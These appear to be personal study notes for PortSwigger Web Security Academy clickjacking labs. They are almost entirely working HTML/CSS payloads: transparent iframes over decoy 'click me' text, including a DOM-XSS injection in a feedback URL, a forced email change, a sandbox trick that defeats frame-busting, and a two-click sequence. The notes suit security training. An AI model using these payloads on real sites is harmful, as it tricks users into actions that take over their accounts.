**Clickjacking with DOM-XSS
![[Pasted image 20260610100307.png]]
```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
**ChangeEmail**
```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:500px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="https://YOUR-ID.web-security-academy.net/my-account/?change-email&email=test2@gmail.com"></iframe>
```
**Ifarm can't use
```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:500px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="https://YOUR-ID.web-security-academy.net/my-account?email=test2@gmail.com"></iframe>
```
**Multistep
```
<style>
iframe {
position:relative;
width:100%;
height:100%;
opacity: 0.01;
z-index: 2;
}

.firstClick, .secondClick { 
position:absolute;
top:535px;
left:125px;
z-index: 1; }

.secondClick {
top:335px;
left:280px;
}

</style>

<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>

<iframe src="0a900025044fe0c78ba4e34a001c00c2.web-security-academy.net/my-account"></iframe>
```
